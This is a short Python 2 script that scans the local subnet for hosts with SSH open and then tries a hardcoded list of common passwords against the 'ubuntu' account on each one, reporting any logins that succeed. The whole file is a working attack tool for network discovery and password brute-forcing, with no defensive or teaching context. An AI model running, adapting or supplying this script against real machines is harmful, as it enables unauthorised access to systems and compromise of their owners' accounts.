from socket import *
import sys, time, paramiko
from datetime import time

ssh_port = 22
targets = []
username = 'ubuntu'
passwords = ['111111','1234','12345','123456','1234567','12345678','abc123','dragon','iloveyou','letmein','monkey','password','qwerty','tequiero','test','ubuntu']

# Find local IP address
s = socket(AF_INET, SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
host = s.getsockname()[0]
s.close()

# Generate target subnet IP addresses
n_list = host.split('.')[:-1]
subnet_prefix = ''
for n in n_list:
	subnet_prefix += n
	subnet_prefix += '.'
subnet = [subnet_prefix + str(x+3) for x in range(10)]

def scan_host(host,port,r_code=1):
	print "scanning " + host
	try:
		s = socket(AF_INET, SOCK_STREAM)
		code = s.connect_ex((host,port))
		if code == 0:
			r_code = code
		s.close()
	except Exception, e:
		pass
	return r_code

def ssh_connect(host, username, password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, port=ssh_port, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error, e:
		code = 2
	ssh.close()
	return code

# Find machines with open SSH port 
for host in subnet:
	try:
		resp = scan_host(host,ssh_port)
		if resp == 0:
			targets.append({'ip': host, 'username': username, 'password': ''})
		else:
			pass
	except Exception, e:
		print e
		pass

# Brute-force the passowrd of the machines found
for i in range(len(targets)):
	host = targets[i]['ip']
	username = targets[i]['username']
	print('Brute forcing ' + host)
	for password in passwords:
		try:
			resp = ssh_connect(host, username, password)
			if resp == 0:
				targets[i]['password'] = password
			else:
				pass
		except Exception, e:
			print e
			pass
	print targets[i]



				
				
	
	

	


